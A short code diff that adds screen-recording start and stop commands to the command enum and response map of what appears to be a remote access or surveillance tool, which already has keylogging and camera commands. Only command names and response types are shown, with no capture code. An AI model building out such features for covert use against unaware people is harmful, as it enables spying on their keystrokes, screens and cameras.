@@ -40,6 +40,8 @@ class Command(Enum):
     START_KEYLOG = "START_KEYLOG"
     STOP_KEYLOG = "STOP_KEYLOG"
     EXPORT_KEYLOG_TEXT = "EXPORT_KEYLOG_TEXT"
+    START_SCREEN_RECORDING = "START_SCREEN_RECORDING"
+    STOP_SCREEN_RECORDING = "STOP_SCREEN_RECORDING"
 
     GET_AVAILABLE_DEVICES = "GET_AVAILABLE_DEVICES"
     START_CAMERA = "START_CAMERA"
@@ -162,6 +164,8 @@ command_response_map = {
     Command.START_KEYLOG: ResponseType.JSON_RESPONSE,
     Command.STOP_KEYLOG: ResponseType.JSON_RESPONSE,
     Command.EXPORT_KEYLOG_TEXT: ResponseType.JSON_RESPONSE,
+    Command.START_SCREEN_RECORDING: ResponseType.STREAM,
+    Command.STOP_SCREEN_RECORDING: ResponseType.STREAM,
 
     # System Commands
     # Assuming JSON_RESPONSE for informational commands and FILE_RESPONSE for any commands that result in downloads
